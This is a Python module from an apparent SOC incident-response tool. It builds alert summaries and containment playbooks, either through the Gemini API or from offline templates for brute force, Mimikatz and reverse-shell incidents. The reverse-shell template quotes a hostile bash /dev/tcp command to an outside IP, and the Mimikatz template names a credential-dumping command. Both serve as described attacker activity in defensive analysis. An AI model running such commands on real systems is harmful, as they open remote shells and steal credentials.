import httpx
import logging
from typing import Dict, Any, List, Optional
from ..config import settings

logger = logging.getLogger(__name__)

# High-fidelity security analysis templates for offline/zero-config mode
OFFLINE_PLAYBOOKS = {
    "brute_force": {
        "summary": """### AI Investigation Summary: Potential SSH/RDP Brute Force
**What Happened**: An external host (`203.0.113.19`) attempted multiple login sessions in a very short duration (20 failed logins) and was subsequently followed by a successful login under the user context `admin` on host `WS-PROD-01`.
**Why it is suspicious**: A high volume of authentication failures followed by a success is a classic signature of a successful password-spraying or brute-force attack (MITRE T1110).
**Attacker Objective**: Credential Access & Initial Access. The attacker aims to gain local user privileges to establish a foothold in the environment.
**Investigation Next Steps**:
1. Check event timestamps to verify session durations.
2. Cross-reference the source IP `203.0.113.19` with recent logins across other systems.
3. Review audit logs to verify if MFA was prompted or bypassed.
4. Review post-login activities (e.g. process execution) for the `admin` account.""",
        
        "playbook": """### Containment & Remediation Playbook
1. **Host Isolation**: Block network communication from IP `203.0.113.19` at the perimeter firewall.
2. **Account Action**: Temporarily disable or reset password for the compromised `admin` account.
3. **Session Revocation**: Terminate all active logins and SSH/RDP sessions for `admin` on `WS-PROD-01`.
4. **MFA Enforcement**: Enforce multi-factor authentication (MFA) policy for all administrative logins.
5. **Log Review**: Search for command executions by `admin` within a 1-hour window post-successful-login."""
    },
    
    "mimikatz": {
        "summary": """### AI Investigation Summary: Credential Dumping (Mimikatz)
**What Happened**: Process creation for `mimikatz.exe` (SHA256: `2566ecb7548...`) was detected on `WS-PROD-01` under the user context `SYSTEM`. The command line attempted to dump LSASS memory (`sekurlsa::logonpasswords`).
**Why it is suspicious**: Mimikatz is a well-known credential theft utility. Execution with `SYSTEM` rights to access LSASS memory indicates active post-exploitation activity (MITRE T1003.001).
**Attacker Objective**: Privilege Escalation & Lateral Movement. The attacker is harvesting plain-text passwords and NTLM hashes to move laterally across the domain.
**Investigation Next Steps**:
1. Identify the parent process of `mimikatz.exe` (often a compromised service or shell).
2. Look for suspicious NTLM authentication requests originating from this host to other servers in the AD environment.
3. Review registry changes, specifically check if `UseSecurityPackages` was modified.""",
        
        "playbook": """### Containment & Remediation Playbook
1. **Immediate Isolation**: Isolate host `WS-PROD-01` from the active network block using the EDR agent or firewall rules.
2. **Process Termination**: Force-kill the Mimikatz process PID and its parent process (e.g. suspicious PowerShell or Cmd shell).
3. **Password Reset**: Enforce global password resets for all accounts active on `WS-PROD-01` in the last 24 hours (including local administrators and active domain admins).
4. **LSASS Protection**: Ensure LSA protection is enabled on all hosts (`RunAsPPL` registry key set to 1).
5. **Credential Review**: Review domain controllers for Pass-the-Hash (T1550) or golden ticket creation indicators."""
    },

    "reverse_shell": {
        "summary": """### AI Investigation Summary: Reverse Shell Connection Established
**What Happened**: A process spawned a bash connection (`bash -i >& /dev/tcp/198.51.100.45/4444`) on a Linux endpoint `linux-srv-01` under the user context `www-data`.
**Why it is suspicious**: A reverse shell redirection originating from webserver service accounts (like `www-data` or `nginx`) indicates successful Remote Code Execution (RCE) (MITRE T1059.004).
**Attacker Objective**: Execution & Command and Control. Allows the attacker to run remote terminal sessions bypassing inbound firewall rules.
**Investigation Next Steps**:
1. Check the parent process of the shell (e.g. `apache2`, `tomcat`, `php-fpm`) to find the vulnerable web entrypoint.
2. Inspect directory `/tmp` and `/dev/shm` for downloaded staging binaries.
3. Check web application log files (e.g. `/var/log/nginx/access.log`) around the timestamp of execution to identify the exploited URL/endpoint.""",
        
        "playbook": """### Containment & Remediation Playbook
1. **Network Kill**: Terminate the established network connection to IP `198.51.100.45` on port `4444`.
2. **Process Kill**: Kill the bash process PID and the web application parent worker process that spawned it.
3. **Application Patching**: Pause the web application/service and patch the vulnerability (e.g. file upload flaw, SQL Injection, log4j).
4. **Permissive Checks**: Search `/var/www/html` for newly created PHP/Python shell files (webshells) and delete them.
5. **Log Retention**: Collect and archive application access logs and Syslog records for forensic parsing."""
    }
}

async def ask_gemini(prompt: str) -> Optional[str]:
    if not settings.GEMINI_API_KEY:
        return None
        
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={settings.GEMINI_API_KEY}"
    payload = {
        "contents": [{
            "parts": [{
                "text": prompt
            }]
        }]
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.post(url, json=payload)
            if resp.status_code == 200:
                data = resp.json()
                # Parse response structure: data['candidates'][0]['content']['parts'][0]['text']
                candidates = data.get("candidates", [])
                if candidates:
                    content = candidates[0].get("content", {})
                    parts = content.get("parts", [])
                    if parts:
                        return parts[0].get("text", "")
            else:
                logger.error(f"Gemini API returned error code {resp.status_code}: {resp.text}")
    except Exception as e:
        logger.error(f"Error querying Gemini: {e}")
    return None

async def generate_incident_analysis(incident_data: Dict[str, Any], alerts: List[Dict[str, Any]]) -> Dict[str, str]:
    """
    Generates a natural language incident summary and containment playbook.
    """
    title = incident_data.get("title", "")
    desc = incident_data.get("description", "")
    host = incident_data.get("host_affected", "Unknown Host")
    user = incident_data.get("user_affected", "Unknown User")
    severity = incident_data.get("severity", "Low")
    risk_score = incident_data.get("risk_score", 0)
    
    # Check for simulation scenarios first for instant local validation
    lower_title = title.lower()
    lower_desc = desc.lower()
    
    selected_scenario = None
    if "mimikatz" in lower_title or "mimikatz" in lower_desc or any("mimikatz" in str(a).lower() for a in alerts):
        selected_scenario = "mimikatz"
    elif "brute force" in lower_title or "brute" in lower_title or any("login" in str(a).lower() for a in alerts):
        selected_scenario = "brute_force"
    elif "reverse shell" in lower_title or "reverse" in lower_title or any("reverse" in str(a).lower() for a in alerts):
        selected_scenario = "reverse_shell"

    # If Gemini API Key is configured, build a rich prompt and query the LLM
    if settings.GEMINI_API_KEY and settings.AI_PROVIDER == "gemini":
        alerts_summary = ""
        for i, alert in enumerate(alerts):
            alerts_summary += f"\nAlert {i+1}: {alert.get('rule_name')} (Severity: {alert.get('severity')})\n"
            alerts_summary += f"Description: {alert.get('description')}\n"
            alerts_summary += f"Details: {alert.get('details')}\n"

        prompt = f"""You are a Senior SOC Analyst and Incident Responder. Analyze this correlated security incident and generate a high-fidelity incident analysis.

Incident Details:
- Title: {title}
- Target Host: {host}
- User Context: {user}
- Cumulative Severity: {severity}
- Risk Score: {risk_score}
- Raw Description: {desc}

Correlated Security Alerts:
{alerts_summary}

Please respond with exactly two markdown sections:
1. AI Investigation Summary
   - Explain what happened in plain language.
   - Why it is suspicious.
   - The associated MITRE ATT&CK techniques.
   - The attacker's potential objective.
   - Logical investigation steps.
2. Containment & Remediation Playbook
   - Actionable remediation steps for containment, eradication, and recovery.

Ensure the tone is professional, analytical, and highly technical. Return standard Markdown. Do not include introductory notes or wrapping.
"""
        logger.info(f"Querying Gemini API for incident: {title}")
        response = await ask_gemini(prompt)
        if response:
            # We split the response into Summary and Playbook sections if possible, otherwise split in half
            if "### Containment" in response or "## Containment" in response or "Playbook" in response:
                parts = response.split("### Containment" if "### Containment" in response else "## Containment")
                if len(parts) >= 2:
                    return {
                        "summary": parts[0].strip(),
                        "playbook": ("### Containment" if "### Containment" in response else "## Containment") + parts[1]
                    }
            return {
                "summary": response,
                "playbook": "### Containment & Remediation Playbook\nRefer to standard incident response playbooks for this type of threat."
            }

    # Offline/Simulation Fallback
    if selected_scenario and selected_scenario in OFFLINE_PLAYBOOKS:
        logger.info(f"Using high-fidelity offline AI template for scenario: {selected_scenario}")
        return OFFLINE_PLAYBOOKS[selected_scenario]
        
    # Generic security incident fallback
    logger.info("Using generic offline security template.")
    return {
        "summary": f"""### AI Investigation Summary: {title}
**What Happened**: Correlated alerts detected suspicious activity on endpoint `{host}` associated with user `{user}`.
**Why it is suspicious**: The incident presents a cumulative risk score of {risk_score}/100, composed of indicators from the detection engine.
**MITRE ATT&CK Mapping**: Matches techniques detected during alerts analysis.
**Attacker Objective**: Execution, access, or staging activities.
**Investigation Next Steps**:
1. View the raw alert logs in the Hunting dashboard.
2. Confirm if the activity correlates with a known administrative service window.
3. Validate user credentials and login sources.""",
        
        "playbook": f"""### Containment & Remediation Playbook
1. **Validate and Assess**: Contact user `{user}` to confirm if this activity was authorized.
2. **Containment**: If unauthorized, isolate host `{host}` from network zones.
3. **Eradication**: Kill any suspicious processes identified in the timeline logs.
4. **Credential Audit**: Perform key rotation and password resets if token leakage is suspected."""
    }
